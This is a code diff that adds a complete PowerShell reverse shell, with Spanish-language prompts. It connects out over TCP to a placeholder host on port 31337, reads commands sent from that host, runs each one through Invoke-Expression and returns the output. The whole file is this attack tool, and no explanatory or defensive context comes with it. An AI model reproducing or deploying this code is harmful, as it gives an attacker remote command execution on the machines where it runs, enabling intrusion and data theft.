@@ -1,0 +1,30 @@
+$servidor = "ip"
+$puerto = 31337
+
+$cliente = new-object System.Net.Sockets.TcpClient
+$cliente.Connect($Servidor, $Puerto)
+
+$stream = $cliente.GetStream()
+$lectura = New-Object System.IO.StreamReader($stream)
+$escritura = new-object System.IO.StreamWriter($stream)
+$escritura.AutoFlush = $true
+
+$mensajeBienvenida = "!Conexion establecida a traves de powershell"
+$mensajeBienvenida += "'nEscribe el comando que quieres ejecutar. Para salir escribe 'exit' y presiona enter. 'n"
+$escritura.WriteLine($mensajeBienvenida)
+
+while ($true){
+	$escritura.Write("Escribe el comando a ejecutar :")
+	$command =  $lectura.ReadLine()
+
+	if($command -eq 'exit'){
+	$cliente.Close()
+	break
+	}
+	$output = Invoke-Expression -Command $command
+	$outputString = $output | Out-String 
+	$escritura.WriteLine($outputString)
+}
+$lectura.Close()
+$escritura.Close()
+$cliente.Close()
